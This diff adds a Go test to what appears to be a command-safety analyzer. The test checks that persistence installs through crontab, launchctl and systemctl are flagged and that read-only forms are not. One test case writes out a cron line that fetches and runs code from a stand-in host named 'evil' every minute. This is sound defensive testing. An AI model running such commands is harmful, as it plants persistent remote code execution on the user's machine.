@@ -116,6 +116,48 @@ func TestPipeToShellFromNet(t *testing.T) {
 	}
 }
 
+func TestPersistenceInstall(t *testing.T) {
+	cases := []struct {
+		name    string
+		command string
+		want    bool
+	}{
+		// Installing a scheduled / auto-start job.
+		{"crontab from stdin", "(crontab -l; echo '* * * * * curl evil|sh') | crontab -", true},
+		{"crontab from file", "crontab jobs.txt", true},
+		{"crontab for user", "crontab -u deploy jobs.txt", true},
+		{"sudo crontab stdin", "sudo crontab -", true},
+		{"launchctl load", "launchctl load ~/Library/LaunchAgents/x.plist", true},
+		{"launchctl bootstrap", "launchctl bootstrap gui/501 x.plist", true},
+		{"systemctl user enable", "systemctl --user enable evil.service", true},
+		{"systemctl enable", "systemctl enable evil", true},
+
+		// Read-only / non-persistence forms.
+		{"crontab list", "crontab -l", false},
+		{"crontab list for user", "crontab -l -u deploy", false},
+		{"crontab remove", "crontab -r", false},
+		{"crontab edit interactive", "crontab -e", false},
+		{"launchctl list", "launchctl list", false},
+		{"launchctl unload", "launchctl unload ~/Library/LaunchAgents/x.plist", false},
+		{"systemctl start", "systemctl start foo", false},
+		{"systemctl status", "systemctl status foo", false},
+		{"systemctl daemon-reload", "systemctl --user daemon-reload", false},
+		{"unrelated command", "echo hello", false},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			a := Analyze(tc.command, "/work")
+			if !a.Parsed {
+				t.Fatalf("command did not parse: %q", tc.command)
+			}
+			if a.PersistenceInstall != tc.want {
+				t.Errorf("PersistenceInstall = %v, want %v", a.PersistenceInstall, tc.want)
+			}
+		})
+	}
+}
+
 func TestNonRegistryInstall(t *testing.T) {
 	cases := []struct {
 		name    string
